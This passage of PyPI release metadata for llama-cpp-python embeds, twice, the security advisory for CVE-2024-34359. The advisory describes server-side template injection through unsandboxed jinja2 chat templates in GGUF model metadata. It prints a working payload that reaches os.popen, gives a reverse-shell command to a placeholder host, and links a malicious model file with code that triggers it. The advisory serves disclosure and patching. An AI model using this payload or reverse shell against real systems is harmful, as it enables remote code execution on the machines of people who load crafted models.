https://drive.google.com/file/d/1uLiU-uidESCs_4EqXDiyKR1eNOF1IUtb/view?usp=sharing\n","fixed_in":["0.2.72"],"id":"GHSA-56xg-wfcc-g829","link":"https://osv.dev/vulnerability/GHSA-56xg-wfcc-g829","source":"osv","summary":null,"withdrawn":null}]},"0.2.6":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.6/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.6","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"ffca8c45e45abb21069f6274efe3f1cf0aca29a1fd089fec6acf924ee4a67c46","md5":"8f4623ab6420543bef2ab4fdda0f8668","sha256":"5f751db065c3bf7969ddf64a0051cffef6952479624e2c042bb35239f6ba13a2"},"downloads":-1,"filename":"llama_cpp_python-0.2.6.tar.gz","has_sig":false,"md5_digest":"8f4623ab6420543bef2ab4fdda0f8668","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":1551867,"upload_time":"2023-09-15T18:25:07","upload_time_iso_8601":"2023-09-15T18:25:07.064473Z","url":"https://files.pythonhosted.org/packages/ff/ca/8c45e45abb21069f6274efe3f1cf0aca29a1fd089fec6acf924ee4a67c46/llama_cpp_python-0.2.6.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.2.60":{"info":{"author":null,"author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":null,"keywords":null,"license":"MIT","maintainer":null,"maintainer_email":null,"name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.60/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.60","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"fdc7d0fd42f15abca13448f7c6b8a0a1e82fb3ee1252fe589413805cc6219edb","md5":"9767cb8cff0c12366a730deec946c693","sha256":"0cb98955ae6a14dacb9418d9793e4fe1a5575be3b01a55c1d49d48c79c3b19c3"},"downloads":-1,"filename":"llama_cpp_python-0.2.60.tar.gz","has_sig":false,"md5_digest":"9767cb8cff0c12366a730deec946c693","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":37372125,"upload_time":"2024-04-06T06:00:41","upload_time_iso_8601":"2024-04-06T06:00:41.047968Z","url":"https://files.pythonhosted.org/packages/fd/c7/d0fd42f15abca13448f7c6b8a0a1e82fb3ee1252fe589413805cc6219edb/llama_cpp_python-0.2.60.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-34359"],"details":"## Description\n\n`llama-cpp-python` depends on class `Llama` in `llama.py` to load `.gguf` llama.cpp or Latency Machine Learning Models. The `__init__` constructor built in the `Llama` takes several parameters to configure the loading and running of the model. Other than `NUMA, LoRa settings`, `loading tokenizers,` and `hardware settings`, `__init__` also loads the `chat template` from targeted `.gguf` 's Metadata and furtherly parses it to `llama_chat_format.Jinja2ChatFormatter.to_chat_handler()` to construct the `self.chat_handler` for this model. Nevertheless, `Jinja2ChatFormatter` parse the `chat template` within the Metadate with sandbox-less `jinja2.Environment`, which is furthermore rendered in `__call__` to construct the `prompt` of interaction. This allows `jinja2` Server Side Template Injection which leads to RCE by a carefully constructed payload.\n\n## Source-to-Sink\n\n### `llama.py` -> `class Llama` -> `__init__`:\n\n```python\nclass Llama:\n    \"\"\"High-level Python wrapper for a llama.cpp model.\"\"\"\n\n    __backend_initialized = False\n\n    def __init__(\n        self,\n        model_path: str,\n\t\t# lots of params; Ignoring\n    ):\n \n        self.verbose = verbose\n\n        set_verbose(verbose)\n\n        if not Llama.__backend_initialized:\n            with suppress_stdout_stderr(disable=verbose):\n                llama_cpp.llama_backend_init()\n            Llama.__backend_initialized = True\n\n\t\t# Ignoring lines of unrelated codes.....\n\n        try:\n            self.metadata = self._model.metadata()\n        except Exception as e:\n            self.metadata = {}\n            if self.verbose:\n                print(f\"Failed to load metadata: {e}\", file=sys.stderr)\n\n        if self.verbose:\n            print(f\"Model metadata: {self.metadata}\", file=sys.stderr)\n\n        if (\n            self.chat_format is None\n            and self.chat_handler is None\n            and \"tokenizer.chat_template\" in self.metadata\n        ):\n            chat_format = llama_chat_format.guess_chat_format_from_gguf_metadata(\n                self.metadata\n            )\n\n            if chat_format is not None:\n                self.chat_format = chat_format\n                if self.verbose:\n                    print(f\"Guessed chat format: {chat_format}\", file=sys.stderr)\n            else:\n                template = self.metadata[\"tokenizer.chat_template\"]\n                try:\n                    eos_token_id = int(self.metadata[\"tokenizer.ggml.eos_token_id\"])\n                except:\n                    eos_token_id = self.token_eos()\n                try:\n                    bos_token_id = int(self.metadata[\"tokenizer.ggml.bos_token_id\"])\n                except:\n                    bos_token_id = self.token_bos()\n\n                eos_token = self._model.token_get_text(eos_token_id)\n                bos_token = self._model.token_get_text(bos_token_id)\n\n                if self.verbose:\n                    print(f\"Using gguf chat template: {template}\", file=sys.stderr)\n                    print(f\"Using chat eos_token: {eos_token}\", file=sys.stderr)\n                    print(f\"Using chat bos_token: {bos_token}\", file=sys.stderr)\n\n                self.chat_handler = llama_chat_format.Jinja2ChatFormatter(\n                    template=template,\n                    eos_token=eos_token,\n                    bos_token=bos_token,\n                    stop_token_ids=[eos_token_id],\n                ).to_chat_handler()\n\n        if self.chat_format is None and self.chat_handler is None:\n            self.chat_format = \"llama-2\"\n            if self.verbose:\n                print(f\"Using fallback chat format: {chat_format}\", file=sys.stderr)\n                \n```\n\nIn `llama.py`, `llama-cpp-python` defined the fundamental class for model initialization parsing (Including `NUMA, LoRa settings`, `loading tokenizers,` and stuff ). In our case, we will be focusing on the parts where it processes `metadata`; it first checks if `chat_format` and `chat_handler` are `None` and checks if the key `tokenizer.chat_template` exists in the metadata dictionary `self.metadata`. If it exists, it will try to guess the `chat format` from the `metadata`. If the guess fails, it will get the value of `chat_template` directly from `self.metadata.self.metadata` is set during class initialization and it tries to get the metadata by calling the model's metadata() method, after that, the `chat_template` is parsed into `llama_chat_format.Jinja2ChatFormatter` as params which furthermore stored the `to_chat_handler()` as `chat_handler`\n\n### `llama_chat_format.py` -> `Jinja2ChatFormatter`:\n\n`self._environment =  jinja2.Environment( -> from_string(self.template) -> self._environment.render(`\n\n```python\nclass ChatFormatter(Protocol):\n    \"\"\"Base Protocol for a chat formatter. A chat formatter is a function that\n    takes a list of messages and returns a chat format response which can be used\n    to generate a completion. The response can also include a stop token or list\n    of stop tokens to use for the completion.\"\"\"\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        **kwargs: Any,\n    ) -> ChatFormatterResponse: ...\n\n\nclass Jinja2ChatFormatter(ChatFormatter):\n    def __init__(\n        self,\n        template: str,\n        eos_token: str,\n        bos_token: str,\n        add_generation_prompt: bool = True,\n        stop_token_ids: Optional[List[int]] = None,\n    ):\n        \"\"\"A chat formatter that uses jinja2 templates to format the prompt.\"\"\"\n        self.template = template\n        self.eos_token = eos_token\n        self.bos_token = bos_token\n        self.add_generation_prompt = add_generation_prompt\n        self.stop_token_ids = set(stop_token_ids) if stop_token_ids is not None else None\n\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render(\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n\n```\n\nAs we can see in `llama_chat_format.py` -> `Jinja2ChatFormatter`, the constructor `__init__` initialized required `members` inside of the class; Nevertheless, focusing on this line:\n\n```python\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n```\n\nFun thing here: `llama_cpp_python` directly loads the `self.template` (`self.template = template` which is the `chat template` located in the `Metadate` that is parsed as a param) via `jinja2.Environment.from_string(` without setting any sandbox flag or using the protected `immutablesandboxedenvironment `class. This is extremely unsafe since the attacker can implicitly tell `llama_cpp_python` to load malicious `chat template` which is furthermore rendered in the `__call__` constructor, allowing RCEs or Denial-of-Service since `jinja2`'s renderer evaluates embed codes like `eval()`, and we can utilize expose method by exploring the attribution such as `__globals__`, `__subclasses__` of pretty much anything.\n\n```python\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render( # rendered!\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n```\n\n## Exploiting\n\nFor our exploitation, we first downloaded [qwen1_5-0_5b-chat-q2_k.gguf](https://huggingface.co/Qwen/Qwen1.5-0.5B-Chat-GGUF/blob/main/qwen1_5-0_5b-chat-q2_k.gguf) of `Qwen/Qwen1.5-0.5B-Chat-GGUF` on `huggingface` as the base of the exploitation, by importing the file to `Hex-compatible` editors (In my case I used the built-in `Hex editor` or `vscode`), you can try to search for key `chat_template` (imported as `template = self.metadata[\"tokenizer.chat_template\"]` in `llama-cpp-python`):\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405021808647.png\" alt=\"image-20240502180804562\" style=\"zoom: 25%;\" />\n\n`qwen1_5-0_5b-chat-q2_k.gguf` appears to be using the OG `role+message` and using the fun `jinja2` syntax. By first replacing the original `chat_template` in `\\x00`, then inserting our SSTI payload. We constructed this payload which firstly iterates over the subclasses of the base class of all classes in Python. The expression `().__class__.__base__.__subclasses__()` retrieves a list of all subclasses of the basic `object` class and then we check if its `warning` by `if \"warning\" in x.__name__`, if it is , we access its module via the `_module` attribute then access Python's built-in functions through `__builtins__` and uses the `__import__` function to import the `os` module and finally we called `os.popen` to `touch /tmp/retr0reg`, create an empty file call `retr0reg` under `/tmp/`\n\n```python\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"touch /tmp/retr0reg\")}}{%endif%}{% endfor %}\n```\n\nin real life exploiting instance, we can change `touch /tmp/retr0reg` into arbitrary codes like `sh -i >& /dev/tcp/<HOST>/<PORT> 0>&1` to create a reverse shell connection to specified host, in our case we are using `touch /tmp/retr0reg` to showcase the exploitability of this vulnerability.\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405022009159.png\" alt=\"image-20240502200909127\" style=\"zoom:50%;\" />\n\nAfter these steps, we got ourselves a malicious model with an embedded payload in `chat_template` of the `metahead`, in which will be parsed and rendered by `llama.py:class Llama:init ->  self.chat_handler `-> `llama_chat_format.py:Jinja2ChatFormatter:init ->  self._environment = jinja2.Environment(` -> ``llama_chat_format.py:Jinja2ChatFormatter:call -> self._environment.render(`\n\n*(The uploaded malicious model file is in https://huggingface.co/Retr0REG/Whats-up-gguf )*\n\n```python\nfrom llama_cpp import Llama\n\n# Loading locally:\nmodel = Llama(model_path=\"qwen1_5-0_5b-chat-q2_k.gguf\")\n# Or loading from huggingface:\nmodel = Llama.from_pretrained(\n    repo_id=\"Retr0REG/Whats-up-gguf\",\n    filename=\"qwen1_5-0_5b-chat-q2_k.gguf\",\n    verbose=False\n)\n\nprint(model.create_chat_completion(messages=[{\"role\": \"user\",\"content\": \"what is the meaning of life?\"}]))\n```\n\nNow when the model is loaded whether as ` Llama.from_pretrained` or `Llama` and chatted, our malicious code in the `chat_template` of the `metahead` will be triggered and execute arbitrary code. \n\nPoC video here: https://drive.google.com/file/d/1uLiU-uidESCs_4EqXDiyKR1eNOF1IUtb/view?usp=sharing\n","fixed_in":["0.2.72"],"id":"GHSA-56xg-wfcc-g829","link":"https://osv.dev/vulnerability/GHSA-56xg-wfcc-g829","source":"osv","summary":null,"withdrawn":null}]},"0.2.61":{"info":{"author":null,"author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":null,"keywords":null,"license":"MIT","maintainer":null,"maintainer_email":null,"name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.61/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","PyYAML>=5.1; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.61","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"4735e9148ee3edbfabc151f84fec765703e5653ca00c6edb90ddb8ac958db620","md5":"e0be4dacf8ae065387ed615ac3445ef4","sha256":"2d554259a66040f5daae7f3cf7e43b44971dc49f10225a9ba196eb2a49778bd4"},"downloads":-1,"filename":"llama_cpp_python-0.2.61.tar.gz","has_sig":false,"md5_digest":"e0be4dacf8ae065387ed615ac3445ef4","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":37444454,"upload_time":"2024-04-10T07:51:07","upload_time_iso_8601":"2024-04-10T07:51:07.098350Z","url":"https://files.pythonhosted.org/packages/47/35/e9148ee3edbfabc151f84fec765703e5653ca00c6edb90ddb8ac958db620/llama_cpp_python-0.2.61.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-34359"],"details":"## Description\n\n`llama-cpp-python` depends on class `Llama` in `llama.py` to load `.gguf` llama.cpp or Latency Machine Learning Models. The `__init__` constructor built in the `Llama` takes several parameters to configure the loading and running of the model. Other than `NUMA, LoRa settings`, `loading tokenizers,` and `hardware settings`, `__init__` also loads the `chat template` from targeted `.gguf` 's Metadata and furtherly parses it to `llama_chat_format.Jinja2ChatFormatter.to_chat_handler()` to construct the `self.chat_handler` for this model. Nevertheless, `Jinja2ChatFormatter` parse the `chat template` within the Metadate with sandbox-less `jinja2.Environment`, which is furthermore rendered in `__call__` to construct the `prompt` of interaction. This allows `jinja2` Server Side Template Injection which leads to RCE by a carefully constructed payload.\n\n## Source-to-Sink\n\n### `llama.py` -> `class Llama` -> `__init__`:\n\n```python\nclass Llama:\n    \"\"\"High-level Python wrapper for a llama.cpp model.\"\"\"\n\n    __backend_initialized = False\n\n    def __init__(\n        self,\n        model_path: str,\n\t\t# lots of params; Ignoring\n    ):\n \n        self.verbose = verbose\n\n        set_verbose(verbose)\n\n        if not Llama.__backend_initialized:\n            with suppress_stdout_stderr(disable=verbose):\n                llama_cpp.llama_backend_init()\n            Llama.__backend_initialized = True\n\n\t\t# Ignoring lines of unrelated codes.....\n\n        try:\n            self.metadata = self._model.metadata()\n        except Exception as e:\n            self.metadata = {}\n            if self.verbose:\n                print(f\"Failed to load metadata: {e}\", file=sys.stderr)\n\n        if self.verbose:\n            print(f\"Model metadata: {self.metadata}\", file=sys.stderr)\n\n        if (\n            self.chat_format is None\n            and self.chat_handler is None\n            and \"tokenizer.chat_template\" in self.metadata\n        ):\n            chat_format = llama_chat_format.guess_chat_format_from_gguf_metadata(\n                self.metadata\n            )\n\n            if chat_format is not None:\n                self.chat_format = chat_format\n                if self.verbose:\n                    print(f\"Guessed chat format: {chat_format}\", file=sys.stderr)\n            else:\n                template = self.metadata[\"tokenizer.chat_template\"]\n                try:\n                    eos_token_id = int(self.metadata[\"tokenizer.ggml.eos_token_id\"])\n                except:\n                    eos_token_id = self.token_eos()\n                try:\n                    bos_token_id = int(self.metadata[\"tokenizer.ggml.bos_token_id\"])\n                except:\n                    bos_token_id = self.token_bos()\n\n                eos_token = self._model.token_get_text(eos_token_id)\n                bos_token = self._model.token_get_text(bos_token_id)\n\n                if self.verbose:\n                    print(f\"Using gguf chat template: {template}\", file=sys.stderr)\n                    print(f\"Using chat eos_token: {eos_token}\", file=sys.stderr)\n                    print(f\"Using chat bos_token: {bos_token}\", file=sys.stderr)\n\n                self.chat_handler = llama_chat_format.Jinja2ChatFormatter(\n                    template=template,\n                    eos_token=eos_token,\n                    bos_token=bos_token,\n                    stop_token_ids=[eos_token_id],\n                ).to_chat_handler()\n\n        if self.chat_format is None and self.chat_handler is None:\n            self.chat_format = \"llama-2\"\n            if self.verbose:\n                print(f\"Using fallback chat format: {chat_format}\", file=sys.stderr)\n                \n```\n\nIn `llama.py`, `llama-cpp-python` defined the fundamental class for model initialization parsing (Including `NUMA, LoRa settings`, `loading tokenizers,` and stuff ). In our case, we will be focusing on the parts where it processes `metadata`; it first checks if `chat_format` and `chat_handler` are `None` and checks if the key `tokenizer.chat_template` exists in the metadata dictionary `self.metadata`. If it exists, it will try to guess the `chat format` from the `metadata`. If the guess fails, it will get the value of `chat_template` directly from `self.metadata.self.metadata` is set during class initialization and it tries to get the metadata by calling the model's metadata() method, after that, the `chat_template` is parsed into `llama_chat_format.Jinja2ChatFormatter` as params which furthermore stored the `to_chat_handler()` as `chat_handler`\n\n### `llama_chat_format.py` -> `Jinja2ChatFormatter`:\n\n`self._environment =  jinja2.Environment( -> from_string(self.template) -> self._environment.render(`\n\n```python\nclass ChatFormatter(Protocol):\n    \"\"\"Base Protocol for a chat formatter. A chat formatter is a function that\n    takes a list of messages and returns a chat format response which can be used\n    to generate a completion. The response can also include a stop token or list\n    of stop tokens to use for the completion.\"\"\"\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        **kwargs: Any,\n    ) -> ChatFormatterResponse: ...\n\n\nclass Jinja2ChatFormatter(ChatFormatter):\n    def __init__(\n        self,\n        template: str,\n        eos_token: str,\n        bos_token: str,\n        add_generation_prompt: bool = True,\n        stop_token_ids: Optional[List[int]] = None,\n    ):\n        \"\"\"A chat formatter that uses jinja2 templates to format the prompt.\"\"\"\n        self.template = template\n        self.eos_token = eos_token\n        self.bos_token = bos_token\n        self.add_generation_prompt = add_generation_prompt\n        self.stop_token_ids = set(stop_token_ids) if stop_token_ids is not None else None\n\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render(\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n\n```\n\nAs we can see in `llama_chat_format.py` -> `Jinja2ChatFormatter`, the constructor `__init__` initialized required `members` inside of the class; Nevertheless, focusing on this line:\n\n```python\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n```\n\nFun thing here: `llama_cpp_python` directly loads the `self.template` (`self.template = template` which is the `chat template` located in the `Metadate` that is parsed as a param) via `jinja2.Environment.from_string(` without setting any sandbox flag or using the protected `immutablesandboxedenvironment `class. This is extremely unsafe since the attacker can implicitly tell `llama_cpp_python` to load malicious `chat template` which is furthermore rendered in the `__call__` constructor, allowing RCEs or Denial-of-Service since `jinja2`'s renderer evaluates embed codes like `eval()`, and we can utilize expose method by exploring the attribution such as `__globals__`, `__subclasses__` of pretty much anything.\n\n```python\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render( # rendered!\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n```\n\n## Exploiting\n\nFor our exploitation, we first downloaded [qwen1_5-0_5b-chat-q2_k.gguf](https://huggingface.co/Qwen/Qwen1.5-0.5B-Chat-GGUF/blob/main/qwen1_5-0_5b-chat-q2_k.gguf) of `Qwen/Qwen1.5-0.5B-Chat-GGUF` on `huggingface` as the base of the exploitation, by importing the file to `Hex-compatible` editors (In my case I used the built-in `Hex editor` or `vscode`), you can try to search for key `chat_template` (imported as `template = self.metadata[\"tokenizer.chat_template\"]` in `llama-cpp-python`):\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405021808647.png\" alt=\"image-20240502180804562\" style=\"zoom: 25%;\" />\n\n`qwen1_5-0_5b-chat-q2_k.gguf` appears to be using the OG `role+message` and using the fun `jinja2` syntax. By first replacing the original `chat_template` in `\\x00`, then inserting our SSTI payload. We constructed this payload which firstly iterates over the subclasses of the base class of all classes in Python. The expression `().__class__.__base__.__subclasses__()` retrieves a list of all subclasses of the basic `object` class and then we check if its `warning` by `if \"warning\" in x.__name__`, if it is , we access its module via the `_module` attribute then access Python's built-in functions through `__builtins__` and uses the `__import__` function to import the `os` module and finally we called `os.popen` to `touch /tmp/retr0reg`, create an empty file call `retr0reg` under `/tmp/`\n\n```python\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"touch /tmp/retr0reg\")}}{%endif%}{% endfor %}\n```\n\nin real life exploiting instance, we can change `touch /tmp/retr0reg` into arbitrary codes like `sh -i >& /dev/tcp/<HOST>/<PORT> 0>&1` to create a reverse shell connection to specified host, in our case we are using `touch /tmp/retr0reg` to showcase the exploitability of this vulnerability.\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405022009159.png\" alt=\"image-20240502200909127\" style=\"zoom:50%;\" />\n\nAfter these steps, we got ourselves a malicious model with an embedded payload in `chat_template` of the `metahead`, in which will be parsed and rendered by `llama.py:class Llama:init ->  self.chat_handler `-> `llama_chat_format.py:Jinja2ChatFormatter:init ->  self._environment = jinja2.Environment(` -> ``llama_chat_format.py:Jinja2ChatFormatter:call -> self._environment.render(`\n\n*(The uploaded malicious model file is in https://huggingface.co/Retr0REG/Whats-up-gguf )*\n\n```python\nfrom llama_cpp import Llama\n\n# Loading locally:\nmodel = Llama(model_path=\"qwen1_5-0_5b-chat-q2_k.gguf\")\n# Or loading from huggingface:\nmodel = Llama.from_pretrained(\n    repo_id=\"Retr0REG/Whats-up-gguf\",\n    filename=\"qwen1_5-0_5b-chat-q2_k.gguf\",\n    verbose=False\n)\n\nprint(model.create_chat_completion(messages=[{\"role\": \"user\",\"content\": \"what is the meaning of life?\"}]))\n```\n\nNow when the model is loaded whether as ` Llama.from_pretrained` or `Llama` and chatted, our malicious code in the `chat_template` of the `metahead` will be triggered and execute arbitrary code. \n\nPoC video here: https://drive.google.com/file/d/1uLiU-uidESCs_4EqXDiyKR1eNOF1IUtb/view?usp=sharing\n","fixed_in":["0.2.72"],"id":"GHSA-56xg-wfcc-g829","link":"https://osv.dev/vulnerability/GHSA-56xg-wfcc-g829","source":"osv","summary":null,"withdrawn":null}]},"0.2.62":{"info":{"author":null,"author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 